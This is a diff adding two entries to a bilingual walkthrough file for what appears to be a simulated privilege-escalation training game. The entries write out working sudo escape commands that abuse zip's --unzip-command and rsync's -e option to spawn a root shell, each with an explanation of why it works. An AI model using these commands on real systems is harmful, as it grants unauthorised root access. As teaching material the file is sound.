@@ -372,5 +372,21 @@ window.WALKTHROUGHS = {
         { cmd: 'wait', explain: {
             en: 'Let the simulated cron tick pass. Once it fires, /tmp/rootsh exists and running it gives a root shell.',
             fr: 'On laisse passer le tic cron simulé. Une fois déclenché, /tmp/rootsh existe et le lancer donne un shell root.' } }
+    ],
+    36: [ // sudo zip --unzip-command hook
+        { cmd: 'sudo -l', explain: {
+            en: 'Only zip is allowed — an archiving tool. It just compresses files... or so it seems.',
+            fr: "Seul zip est autorisé — un outil d'archivage. Il ne fait que compresser des fichiers... du moins en apparence." } },
+        { cmd: 'sudo zip test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"', explain: {
+            en: '-T tells zip to test the archive it just wrote by handing it to an "unzip command" — meant to be unzip, but zip never checks that. It runs whatever program --unzip-command names, as itself: root.',
+            fr: '-T dit à zip de tester l\'archive qu\'il vient d\'écrire en la confiant à une "commande unzip" — censée être unzip, mais zip ne vérifie jamais ça. Il lance le programme nommé par --unzip-command, en tant que lui-même : root.' } }
+    ],
+    37: [ // sudo rsync -e remote-shell swap
+        { cmd: 'sudo -l', explain: {
+            en: 'Only rsync is allowed — a file-sync tool. It just copies files between hosts... or so it seems.',
+            fr: 'Seul rsync est autorisé — un outil de synchronisation de fichiers. Il ne fait que copier des fichiers entre hôtes... du moins en apparence.' } },
+        { cmd: 'sudo rsync -e "/bin/sh -c /bin/sh" 127.0.0.1:/dev/null /dev/null', explain: {
+            en: "-e picks which program rsync uses to reach a \"remote\" host — meant to be ssh, but rsync execs whatever's named without checking it's a shell client. It runs /bin/sh directly, as root, before ever needing to actually reach anything.",
+            fr: "-e choisit quel programme rsync utilise pour joindre un hôte \"distant\" — censé être ssh, mais rsync exécute ce qui est nommé sans vérifier que c'est un client shell. Il lance /bin/sh directement, en root, avant même d'avoir besoin de joindre quoi que ce soit." } }
     ]
 };
